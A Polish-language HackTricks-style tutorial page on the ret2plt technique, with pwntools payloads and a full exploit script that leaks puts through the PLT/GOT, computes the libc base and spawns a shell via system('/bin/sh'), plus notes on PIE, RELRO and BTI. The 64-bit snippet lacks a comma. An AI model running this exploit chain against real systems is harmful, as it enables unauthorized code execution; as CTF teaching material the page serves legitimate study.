# Ret2plt

{{#include ../../../banners/hacktricks-training.md}}

## Podstawowe informacje

Celem tej techniki jest **leak an address from a function from the PLT**, aby móc obejść ASLR. Dzieje się tak, ponieważ jeśli na przykład leakujesz adres funkcji `puts` z libc, możesz wtedy **calculate where is the base of `libc`** i obliczyć przesunięcia, aby uzyskać dostęp do innych funkcji, takich jak **`system`**.

Można to zrobić za pomocą `pwntools` payloadu takiego jak ([**from here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)):
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
Zauważ, że **`puts`** (używając adresu z PLT) jest wywoływany z adresem `puts` znajdującym się w GOT (Global Offset Table). Dzieje się tak, ponieważ w chwili, gdy `puts` wypisze wpis GOT dla puts, ten **wpis będzie zawierał dokładny adres `puts` w pamięci**.

Zauważ również, jak adres `main` jest użyty w exploicie, więc gdy `puts` zakończy wykonanie, **binary calls `main` again instead of exiting** (so the leaked address will continue to be valid).

> [!CAUTION]
> Zwróć uwagę, że aby to zadziałało **binary cannot be compiled with PIE** lub musisz **found a leak to bypass PIE** aby znać adres PLT, GOT i main. W przeciwnym razie musisz najpierw bypass PIE.

Możesz znaleźć [**full example of this bypass here**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass). To był ostateczny exploit z tamtego **przykładu**:

<details>
<summary>Pełny exploit example (ret2plt leak + system)</summary>
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
</details>

## Nowoczesne uwagi

- **`-fno-plt` builds** (powszechne we współczesnych dystrybucjach) replace `call foo@plt` with `call [foo@got]`. If the binary has no `foo@plt` stub, you can still leak the resolved address with `puts(elf.got['foo'])` and then **return directly to the GOT entry** (`flat(padding, elf.got['foo'])`) to jump into libc once lazy binding has completed.
- **Full RELRO / `-Wl,-z,now`**: GOT jest tylko do odczytu, ale ret2plt nadal działa dla leaków, ponieważ czytasz tylko slot GOT. Jeśli symbol nigdy nie został wywołany, pierwszy ret2plt wykona również lazy binding i następnie wypisze wypełniony slot.
- **ASLR + PIE**: jeśli PIE jest włączone, najpierw wykonaj leak a code pointer (np. zapisany adres powrotu, wskaźnik funkcji lub wpis `.plt` przez inny format‑string/infoleak), aby obliczyć bazę PIE, a następnie zbuduj łańcuch ret2plt z przesuniętymi adresami PLT/GOT.
- **Non‑x86 architectures with BTI/PAC (AArch64)**: wpisy PLT są poprawnymi BTI landing pads (`bti c`), więc przy exploitowaniu binarek z włączonym BTI preferuj skakanie do stubu PLT (lub innego gadgetu oznaczonego BTI) zamiast bezpośrednio do gadgetu libc bez BTI, w przeciwnym razie CPU zgłosi błędy `BRK`/`PAC`.
- **Quick resolution helper**: jeśli docelowa funkcja nie jest jeszcze resolved i potrzebujesz leak w pojedynczym przebiegu, wywołaj PLT dwa razy: najpierw `elf.plt['foo']` (żeby rozwiązać), a potem ponownie `elf.plt['foo']` z adresem GOT jako argumentem, aby wypisać teraz wypełniony slot.

## Inne przykłady & References

- https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html
- 64 bit, ASLR enabled but no PIE, the first step is to fill an overflow until the byte 0x00 of the canary to then call puts and leak it. With the canary a ROP gadget is created to call puts to leak the address of puts from the GOT and the a ROP gadget to call `system('/bin/sh')`
- https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html
- 64 bits, ASLR enabled, no canary, stack overflow in main from a child function. ROP gadget to call puts to leak the address of puts from the GOT and then call an one gadget.

## Referencje

- [MaskRay – All about Procedure Linkage Table](https://maskray.me/blog/2021-09-19-all-about-procedure-linkage-table)

{{#include ../../../banners/hacktricks-training.md}}
